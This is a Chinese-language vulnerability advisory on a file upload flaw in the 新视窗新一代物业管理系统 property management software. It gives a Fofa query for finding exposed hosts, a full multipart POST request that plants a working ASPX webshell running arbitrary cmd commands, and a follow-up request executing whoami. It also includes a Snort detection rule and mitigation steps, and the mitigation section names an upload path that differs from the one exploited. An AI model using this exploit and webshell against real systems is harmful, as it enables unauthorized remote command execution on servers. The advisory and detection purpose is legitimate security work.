# 新视窗新一代物业管理系统 uploadfile.ashx 存在文件上传漏洞

新视窗新一代物业管理系统存在任意文件上传漏洞

# 影响版本

**新视窗新一代物业管理系统至今全版本**

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**Fofa: body=&quot;BPMSite/ClientSupport/OCXInstall.aspx&quot;**

**POC/EXP：**

**step1 写入aspx木马**

```
POST /script/uploadify/uploadfile.ashx?id=1 HTTP/1.1
Host: 127.0.0.1
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWQPGtgGbo1eMeYgQ

------WebKitFormBoundaryWQPGtgGbo1eMeYgQ
Content-Disposition: form-data; name="Filedata" filename="1.aspx"
Content-Type: application/octet-stream

<%@ Page Language="Jscript" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
c.Arguments="/c " + Request.Item["cmd"];
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
e.Close();
Response.Write(out.ReadToEnd() + EI.ReadToEnd());
System.IO.File.Delete(Request.PhysicalPath);
Response.End();%>
------WebKitFormBoundaryWQPGtgGbo1eMeYgQ--
```

​![image](assets/image-20260822151706-bk4612z.png)​

**step2 访问上传的木马文件，执行命令**

```
GET /upload/VotePics/202608221513351.aspx?cmd=whoami HTTP/1.1
Host: 127.0.0.1
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate


```

​![image](assets/image-20260822151850-lt8w72m.png)​

**sonrt规则：**

```
alert tcp any any -> $HOME_NET any (
    msg:"新视窗新一代物业管理系统 - uploadfile.ashx 文件上传漏洞利用 (Webshell访问)";
    flow:to_server,established;
    http.method; content:"GET";
    http.uri; content:"/upload/VotePics/"; fast_pattern;
    http.uri; content:".aspx?cmd="; distance:0; nocase;
    metadata:
        service http,
        affected_product "新视窗新一代物业管理系统",
        vulnerability_type "File Upload leads to Webshell Access",
        severity "critical";
    classtype:web-application-attack;
    sid:1000729;
    rev:1;
    priority:1;
)
```

# 漏洞修复

在官方补丁发布前，建议采取以下紧急措施：

1. **部署WAF规则**：在Web应用防火墙（WAF）上添加规则，**拦截对相关上传接口（如**​ **​`/OfficeManagement/RegisterManager/Upload.aspx`​**​ **）的异常访问请求**。
2. **网络访问控制**：在防火墙上设置策略，**限制管理系统只能从内网或特定可信IP访问**，避免直接暴露在公网。
3. **日志排查**：检查Web服务器日志，寻找对`Upload.aspx`​等上传接口的可疑POST请求，特别是包含`.asp`​、`.aspx`​、`.php`​等恶意文件名的请求。

‍
